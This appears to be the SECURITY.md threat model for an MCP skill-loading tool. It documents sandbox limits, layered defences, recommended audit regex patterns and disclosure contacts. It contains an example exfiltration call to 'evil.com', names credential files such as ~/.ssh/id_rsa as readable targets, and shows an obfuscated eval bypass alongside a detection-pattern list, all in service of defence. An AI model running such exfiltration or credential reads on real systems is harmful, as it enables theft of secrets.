# Security

SkillForge MCP loads and executes Markdown skills supplied by the user. Some skills are pure prompts (no code execution); others can spawn subprocesses via `ScriptStrategy`. This document is the honest threat model — what the sandbox enforces, what it cannot, and the layered defences that compensate.

If you are evaluating SkillForge for production use with **untrusted skill authors**, read the [Sandbox limitations](#sandbox-limitations) section before you flip `security.allowScripts: true`.

---

## Threat model

### In-scope threats

| Threat | Asset | Mitigation |
|--------|-------|------------|
| Malicious skill with obvious shell-eval pattern (`shell=True`, `eval(`, `exec(`, `base64.b64decode`) loaded into the registry | LLM caller, user shell | `PatternScanner` in `BlacklistFilter` rejects on load (`security.autoAudit: true`). |
| Skill explicitly disabled by name | User intent | Manual blacklist (`config.security.blacklist`) — case-sensitive exact match, short-circuits before audit. |
| Untrusted script reading `~/.ssh`, `~/.aws`, `~/.gnupg` via env-var leakage | Cloud credentials, SSH keys | `SandboxRunner.buildEnv` whitelist — subprocess receives only `PATH` (+ explicit overrides). No `HOME` / `USER` / `SSH_AUTH_SOCK`. |
| Untrusted script writing files outside its temp `cwd` to plant persistent artefacts | User filesystem | `cwd = fs.mkdtemp(os.tmpdir()/skillforge-XXXX)` + recursive `fs.rm` in `finally`. (Note: subprocess **can** write outside cwd via hard-coded paths — see [Sandbox limitations](#sandbox-limitations).) |
| Runaway subprocess consuming the host | CPU, memory | `TimeoutDecorator` wall-clock kills via `AbortSignal` → SIGTERM → 5s grace → SIGKILL. |
| Memory-bomb stdout/stderr from a misbehaving script | Node process memory | Tail-truncate at 1 MB each stream. |
| Composite skill cycle causing unbounded recursion | Node call stack, latency | `resolveComposite` runs DFS cycle detection via `collectChain` with per-call visited set. Detection works through shared subtrees. |
| Collision between same-named skills across folders | User intent | `SkillResolver` picks by `priority` desc, ties → input order. The losing copies are not registered (not registered ≠ not on disk). |

### Out-of-scope threats

| Threat | Why out of scope | Recommendation |
|--------|-------------------|----------------|
| Untrusted script making outbound network calls | Node `child_process` cannot block egress | Run SkillForge inside Docker/firecracker with a restrictive network policy. |
| Untrusted script reading any path the OS user can read | Node `child_process` inherits OS user permissions | Run as a less-privileged user. Container/jail isolation. |
| Untrusted script consuming 100% CPU or all RAM until OS kill | No cgroups in Node `child_process` | Wall-clock timeout is the only enforced budget. OS-level resource limits via systemd/`ulimit`/container. |
| LLM prompt injection through skill body | Out-of-band — SkillForge returns body verbatim | Sanitise at the consuming agent. |
| MCP transport tampering | Stdio is local-process, no auth model | Process boundary is the trust boundary. Don't expose stdio over a network. |
| Supply chain — npm dependency compromised | npm audit + lockfile-only installs | `pnpm audit` in CI. Lockfile pinning. |

---

## What the sandbox enforces

`SandboxRunner.run(cmd, args, opts)` does exactly the following, every time:

1. **Fresh temp `cwd`** — `fs.mkdtemp(os.tmpdir()/skillforge-XXXX)` per invocation. Cleanup is in `finally` so cleanup runs even if the abort signal raced.
2. **Env whitelist** — subprocess receives `{ PATH: <DEFAULT_PATH>, ...opts.env }`. On POSIX, `DEFAULT_PATH = '/usr/bin:/bin'`. On Windows, `DEFAULT_PATH = process.env.PATH` — see [Windows PATH compromise](#windows-path-compromise).
3. **stdio shape** — `['ignore', 'pipe', 'pipe']`. The subprocess cannot read from the parent's stdin. stdout and stderr are captured into Buffer chunks.
4. **stdout/stderr cap** — 1 MB each, tail-truncated. Once the limit is hit, further chunks are dropped (the process keeps running, but its stream contributions stop being recorded).
5. **Abort plumbing** — when `opts.signal.aborted` becomes true (typically because `TimeoutDecorator` raced), the runner sends `SIGTERM` to the child, then waits 5 seconds before sending `SIGKILL`. The grace window lets well-behaved scripts flush state.

That's the entire enforcement surface. Everything else listed in the next section is outside what Node `child_process` can guarantee.

---

## Sandbox limitations

`SandboxRunner` is **best-effort isolation, not an OS-grade jail**. The following capabilities are not constrained:

### Network egress

Subprocess inherits the host's network stack. A Python script can `import urllib.request; urllib.request.urlopen('https://evil.com')` and exfiltrate freely. The `metadata.allowNetwork` frontmatter field is a **documentation signal** for skill authors and reviewers — it does not change runtime behaviour. The `opts.allowNetwork` argument passed to `SandboxRunner.run` is similarly informational only.

### Filesystem reads outside cwd

A subprocess running as your OS user can read any path that user can read: `~/.ssh/id_rsa`, `/etc/passwd`, `~/.lyupro/.skillforge/config.json` itself. The env whitelist prevents `HOME`-derived discovery, but a skill author can hard-code paths into the script. **Do not run scripts you do not trust.**

### Filesystem writes outside cwd

Same as reads — subprocess can write to any writable path under its OS user. Even though `cwd` is a fresh temp directory, scripts can write to `~`, `/tmp/`, etc., and those writes persist after `fs.rm(tmpDir)` cleans up the cwd.

### CPU / memory limits

Node `child_process` has no cgroups integration. A subprocess can consume 100% CPU and all available RAM until the OS OOM-killer intervenes. Only the wall-clock `TimeoutDecorator` kills runaways — and only after the timeout fires.

### What "best-effort isolation" buys you

The sandbox makes a credentialed exfiltration harder by removing the obvious paths (env-var leakage of `SSH_AUTH_SOCK`, `AWS_ACCESS_KEY_ID`, etc.). For local-dev use with trusted skill authors (the v1.0 use case), this is enough. For production use with untrusted skill authors, **add an OS-level container** (Docker, firecracker, gVisor) and run SkillForge inside it.

---

## Defence in depth

Four layers stack on top of the sandbox:

### 1. Global gate (`config.security.allowScripts: false` by default)

No script-skill can run unless the operator flips this flag. New installs default to deny. Even with the global gate enabled, per-skill opt-in is still required (see #2).

### 2. Per-skill opt-in (`metadata.allowScripts: true` required)

Every individual skill that wants to spawn a subprocess must declare `allowScripts: true` in its frontmatter. Default `false`. This means **promoting a script-skill takes a deliberate edit of the skill's `.md` file** — not just an environment flag.

### 3. Audit pattern scanner (load-time static analysis)

`PatternScanner` compiles `config.security.auditPatterns` into regexes and matches them against every skill body before registration. Matched skills are excluded with a stderr warning. Default patterns: `shell=True`, `eval\\(`, `exec\\(`, `base64\\.b64decode`. Tighten them via direct config edit — see [Recommended hardening](#recommended-hardening).

The scanner is static analysis, not runtime enforcement. It catches obvious patterns but not obfuscated equivalents (`getattr(__builtins__, 'ev' + 'al')` etc.). Treat the audit as a defence-in-depth tripwire, not the primary line of defence.

### 4. Manual blacklist

`config.security.blacklist: string[]` lists skill names to exclude unconditionally. Exact case-sensitive match, short-circuits before audit. Use this for skills you keep on disk but never want loaded — e.g. drafts, deprecated tools, or known-bad copies.

---

## Windows PATH compromise

On POSIX, `SandboxRunner` restricts `PATH` to `/usr/bin:/bin` — a small, audited surface that still lets `python3` / `bash` / `node` resolve. On Windows, the same restriction would break interpreter discovery (Node, Python, etc. live in user-specific install paths reachable via `%PATH%`), so the runner falls through to `process.env.PATH`.

The trade-off: on Windows, a malicious script can resolve any executable on the host PATH. The other isolation properties (cwd, stdout/stderr caps, abort plumbing) still apply. If you run SkillForge on Windows with `allowScripts: true`, audit the skill body more carefully — or run SkillForge inside WSL2 / a Linux container where the POSIX whitelist applies.

The relevant SandboxRunner unit tests for POSIX-only paths gate themselves with `it.skipIf(process.platform === 'win32')` so the test suite stays green on both platforms without lying about coverage.

---

## Operator decisions

### "Should I enable scripts at all?"

Default no. Enable when:

- All skill authors are trusted (you, your team, your published-skill marketplace listings).
- You've reviewed every script-skill body manually.
- You understand that the sandbox is best-effort, not OS-grade.

Disable when:

- You're loading skills from a public marketplace without review.
- You don't control who can edit your `config.json`.
- You're on Windows without WSL2 / container isolation.

### "Should I tighten the audit patterns?"

Recommended additions for production-leaning setups:

```json
{
  "security": {
    "auditPatterns": [
      "shell=True",
      "eval\\(",
      "exec\\(",
      "base64\\.b64decode",
      "subprocess\\.(call|run|Popen|check_output)",
      "os\\.system",
      "os\\.popen",
      "__import__\\(",
      "import\\s+(pickle|marshal|shelve)",
      "compile\\([^)]*,\\s*'exec'",
      "open\\([^)]*['\"]w['\"][^)]*\\)\\s*\\.write\\(.*\\$\\("
    ]
  }
}
```

Pattern semantics: each entry is a regex source compiled with the `g` flag. Empty or invalid entries drop with a stderr warning at startup. The scanner has a zero-width-match loop guard so patterns like `^` don't hang.

### "How do I review a skill before enabling it?"

For each script-skill:

1. Read the body verbatim. The audit scanner is a tripwire, not a substitute.
2. Read every file in the sibling `scripts/` directory. The audit does **not** scan script files (only skill bodies) — `eval` inside `scripts/main.py` will not be caught.
3. Verify `metadata.allowScripts: true` matches your intent.
4. Verify `metadata.timeoutMs` is small enough that a stuck script doesn't tie up your session.
5. If the skill uses `metadata.allowNetwork: true`, ask: does it really need network? Could it be reframed as a prompt-only skill that asks the LLM to compose the call?

---

## Recommended hardening

For production-leaning deployments:

1. **Run SkillForge inside Docker** — pinning Node version, restricting filesystem mounts, restricting network egress at the container level. Mount only the skill folders you want exposed.
2. **Tighten `auditPatterns`** as above.
3. **Enable the manual blacklist** as a kill-switch list for known-bad skill names.
4. **Limit OS user permissions** — run SkillForge as a dedicated low-privilege user that cannot read `~/.ssh` etc. even if a script bypasses the env whitelist.
5. **Pin the SkillForge version** in your wiring command — don't auto-upgrade behind your back.
6. **Audit dependencies** via `pnpm audit` in CI. SkillForge runtime deps are minimal: `@modelcontextprotocol/sdk`, `chokidar`, `gray-matter`, `zod`.

---

## Responsible disclosure

Security issues should be reported privately, not via public GitHub issues.

- **Preferred:** GitHub Security Advisories on `lyupro/skillforge-mcp` — see the **Security** tab on the repository.
- **Fallback:** email `security@lyupro.com` (PGP key available on request).

Please include:

- Affected version (`pnpm list @lyupro/skillforge-mcp` output or commit SHA).
- Reproducer — minimal skill file + config + invocation steps.
- Impact assessment — what an attacker can achieve.

We aim to acknowledge within 72 hours and ship a patch within 14 days of confirmed reports. Coordinated public disclosure after the patch lands.

---

## Known limitations (v1.0)

- **No OS-level sandbox.** See [Sandbox limitations](#sandbox-limitations) above.
- **Audit scanner runs on skill body only, not on `scripts/*` files.** Script files are loaded into `SandboxRunner` and never inspected.
- **`metadata.allowNetwork` is informational only.** No runtime enforcement.
- **`security.sandboxRestrictedPaths` is informational only.** Documents paths the env whitelist already keeps subprocess from auto-discovering, but doesn't enforce filesystem-level reads.
- **`security.sandboxScripts: false` has no effect in v1** — `SandboxRunner` is the only ScriptStrategy execution path. The flag is reserved for a future no-sandbox dev mode.
- **No cost / rate-limiting decorator.** `CostDecorator` was deferred because SkillForge does not make LLM calls itself (invocation output is text); consumer tools track their own cost.
- **No signed-skill verification.** Skills are loaded by virtue of being on disk in a configured folder.

These are intentional v1.0 cuts. Several are scheduled for v2 (see the project roadmap).
